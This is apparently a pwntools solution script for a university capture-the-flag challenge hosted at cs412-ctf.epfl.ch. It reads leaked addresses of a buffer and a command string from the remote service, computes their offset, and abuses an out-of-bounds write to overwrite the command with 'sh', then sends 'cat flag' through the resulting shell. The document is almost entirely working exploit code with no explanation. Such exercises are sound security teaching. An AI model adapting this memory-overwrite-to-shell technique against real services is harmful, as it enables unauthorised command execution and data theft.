from pwn import *

p=remote("cs412-ctf.epfl.ch", 11002)
a = p.recvuntil("Which position do you want to write into the buffer, and what do you want to write?").decode("utf-8")

buffer_index = a.index("Buffer: ")
addr_b = int(a[buffer_index + 10:buffer_index + 22],16)
command_index = a.index("command: ")
addr_c = int(a[command_index + 11:command_index + 23],16)
offset = addr_c - addr_b

p.sendline(str(offset) + " s")
p.recvuntil("Which position do you want to write into the buffer, and what do you want to write?")
p.sendline(str(offset + 1)+ " h")

p.sendline("cat flag")
flag = p.recvline()
print(flag.decode("utf-8"))
